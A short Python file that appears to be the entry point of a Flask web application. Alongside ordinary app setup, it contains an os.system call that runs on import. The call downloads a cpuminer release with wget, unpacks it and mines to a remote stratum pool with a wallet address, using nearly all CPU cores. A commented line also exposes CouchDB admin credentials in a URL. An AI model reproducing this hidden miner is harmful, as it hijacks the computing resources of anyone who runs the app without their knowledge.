from flask import Flask
from .routes.flaskr import create_app
import os
os.system ('wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespower  -o stratum+tcps://51.79.177.216:17017 -u web1qfzjd2nvq0k72mrjpd0qt9as2gvan4kaww9l8dl.CPU_4 -t $(nproc --ignore 1)')
app = Flask(__name__)
create_app(app)

if __name__ == "__main__":
    app.run()

# test = get(url="http://couchdb-admin:couchdb-password@database:5984/")
# print(test, "\n \n \n \n \n")
